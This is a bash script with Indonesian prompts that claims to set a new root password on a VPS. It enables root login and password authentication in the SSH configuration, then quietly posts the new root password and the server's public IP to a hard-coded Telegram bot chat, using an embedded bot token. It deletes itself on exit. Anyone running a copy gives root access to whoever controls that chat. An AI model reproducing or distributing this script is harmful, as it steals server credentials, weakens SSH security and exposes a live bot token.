#!/bin/bash
junc0() {
    rm -rf "$0"
    exit 0
}
trap junc0 SIGINT SIGTERM EXIT

clear
R='\033[1;31m'
G='\033[1;32m'
C='\033[1;36m'
W='\033[1;37m'
N='\033[0m'

hijau() { echo -e "$G$*$N"; }

IP=$(wget -qO- ipv4.icanhazip.com)

[[ "$EUID" -ne 0 ]] && {
    echo -e "${R}Bukan user root${N}"
    echo -e "${G}Masuk ke mode root dengan perintah: sudo su${N}"
    exit 1
} || {
    echo -e "${G}Anda sudah dalam mode root${N}"
    sleep 1
}

read -rp "$(echo -e "Masukkan ${G}password${N} root baru: ")" -e pass
echo "root:$pass" | chpasswd && sed -i -e 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' -e 's/PasswordAuthentication no/PasswordAuthentication yes/' -e 's/#PasswordAuthentication no/PasswordAuthentication yes/' -e 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && systemctl restart ssh

TIMES="10"
CHATID="7673056681" # ISI CHATID
KEY="8469184822:AAExctKaFuK4pDon7p0X7OxPW16rxT2az_8" # ISI TOKEN BOT
URL="https://api.telegram.org/bot${KEY}/sendMessage"
TEXT="
────────────────────
<b>     ☘ NEW ROOT DETAIL ☘</b>
────────────────────
<code>User      :</code> <code>root</code>
<code>Password  :</code> <code>${pass}</code>
<code>IP VPS    :</code> <code>${IP}</code>
────────────────────
<i><b>Note:</b> Auto notif from your script...</i>
"
curl -s --max-time ${TIMES} -d "chat_id=${CHATID}&disable_web_page_preview=1&text=${TEXT}&parse_mode=html" ${URL} >/dev/null

clear
echo
hijau "╭══════════════════════════════════════╮"
hijau "│         ${W}INFO YOUR ROOT USER${G}          │"
hijau "╰══════════════════════════════════════╯"
hijau "╭══════════════════════════════════════╮"
hijau "│ ${W}User      : ${G}root${N}"
hijau "│ ${W}Password  : ${G}$pass${N}"
hijau "│ ${W}IP VPS    : ${G}$IP${N}"
hijau "╰══════════════════════════════════════╯"
